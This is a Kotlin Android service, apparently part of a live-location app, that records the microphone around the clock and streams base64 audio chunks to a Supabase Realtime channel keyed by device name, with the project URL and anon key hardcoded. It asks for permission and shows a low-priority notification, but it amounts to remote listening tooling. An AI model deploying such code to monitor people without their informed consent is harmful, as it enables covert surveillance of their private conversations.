package com.example.livelocationservice

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.realtime.RealtimeChannel
import io.github.jan.supabase.realtime.broadcast
import io.github.jan.supabase.realtime.channel
import io.github.jan.supabase.realtime.realtime
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withTimeoutOrNull
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread
import kotlin.time.Duration.Companion.seconds

/**
 * Audio capture → live Supabase Realtime Broadcast. 
 * Replaces the old slow INSERT-based approach. 
 */
class AudioUplinkService : Service() {
    private val TAG = "AudioUplinkService"
    private val NOTIFICATION_ID = 67890
    private val CHANNEL_ID = "audio_uplink_channel"

    private val sampleRate = 16000
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat = AudioFormat.ENCODING_PCM_16BIT
    private val chunkMs = 250
    private val samplesPerChunk = (sampleRate * chunkMs) / 1000

    private val supabaseUrl = "https://jyiqhqxjoahlxflaated.supabase.co"
    private val supabaseAnonKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp5aXFocXhqb2FobHhmbGFhdGVkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU0MzIwMjksImV4cCI6MjEwMTAwODAyOX0.Fel6E89P2A-RIhoHv3LYra1ycPxPZG8nYiet8IhDRzg"

    private lateinit var supabase: SupabaseClient
    private lateinit var audioChannel: RealtimeChannel

    private val exceptionHandler = CoroutineExceptionHandler { _, exception ->
        Log.e(TAG, "Unhandled Coroutine Exception: ${exception.message}", exception)
    }
    private val uploadScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + exceptionHandler)

    private val isCapturing = AtomicBoolean(false)
    private var captureThread: Thread? = null
    private var audioRecord: AudioRecord? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service Created")
        startAsForegroundService()
        initSupabase()
        startCaptureLoop()
    }

    private fun initSupabase() {
        try {
            supabase = createSupabaseClient(supabaseUrl, supabaseAnonKey) {
                install(Postgrest)
                install(Realtime) {
                    reconnectDelay = 2.seconds
                    heartbeatInterval = 15.seconds
                }
            }
            uploadScope.launch {
                try {
                    supabase.realtime.connect()
                    
                    val deviceId = LiveLocationService.deviceName()
                    val topic = "media-audio-$deviceId"
                    audioChannel = supabase.channel(topic)
                    audioChannel.subscribe(blockUntilSubscribed = true)
                    Log.d(TAG, "Subscribed to realtime channel: $topic")

                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.e(TAG, "Supabase connect error: ${e.message}")
                }
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Supabase init error: ${e.message}")
        }
    }

    private fun startCaptureLoop() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "RECORD_AUDIO permission not granted, stopping service")
            stopSelf()
            return
        }

        try {
            val minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
            val bufferSize = maxOf(minBufferSize, samplesPerChunk * 2)

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                sampleRate,
                channelConfig,
                audioFormat,
                bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord failed to initialize")
                stopSelf()
                return
            }

            audioRecord?.startRecording()
            isCapturing.set(true)

            captureThread = thread(start = true, isDaemon = true, name = "MicCapture", priority = Thread.MAX_PRIORITY) {
                captureLoop()
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start capture: ${e.message}", e)
            stopSelf()
        }
    }

    private fun captureLoop() {
        val buffer = ShortArray(samplesPerChunk)
        while (isCapturing.get()) {
            val read = audioRecord?.read(buffer, 0, samplesPerChunk) ?: 0
            if (read > 0) {
                uploadChunk(buffer.copyOf(read))
            }
        }
    }

    private fun uploadChunk(buffer: ShortArray) {
        val bytes = ByteArray(buffer.size * 2)
        for (i in buffer.indices) {
            val v = buffer[i].toInt()
            bytes[i * 2] = (v and 0xFF).toByte()
            bytes[i * 2 + 1] = ((v shr 8) and 0xFF).toByte()
        }
        val dataB64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        val deviceId = LiveLocationService.deviceName()

        uploadScope.launch {
            try {
                if (::audioChannel.isInitialized) {
                    val payload = MediaUploadRow(
                        device_id = deviceId,
                        type = "audio",
                        data_b64 = dataB64,
                        mime_type = "audio/pcm",
                        duration_sec = chunkMs / 1000
                    )
                    audioChannel.broadcast(event = "audio_chunk", message = payload)
                    Log.d(TAG, "Chunk broadcasted: ${bytes.size}B")
                }
            } catch (e: CancellationException) {
                throw e
            } catch (e: Exception) {
                Log.e(TAG, "Failed to broadcast chunk: ${e.message}", e)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service Started")
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service Destroyed")
        isCapturing.set(false)
        try {
            captureThread?.let { it.join(1000) }
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing AudioRecord: ${e.message}")
        }
        
        runBlocking {
            withTimeoutOrNull(1500) {
                if (::audioChannel.isInitialized) {
                    try { supabase.realtime.removeChannel(audioChannel) } 
                    catch(e: Exception) {}
                }
                uploadScope.coroutineContext[kotlinx.coroutines.Job]
                    ?.children?.forEach { it.join() }
            }
        }
        uploadScope.cancel()
    }

    private fun startAsForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Audio Uplink Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                description = "Required for 24/7 background audio capture"
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Secure Audio Uplink Active")
            .setContentText("Capturing and streaming microphone audio...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }
}
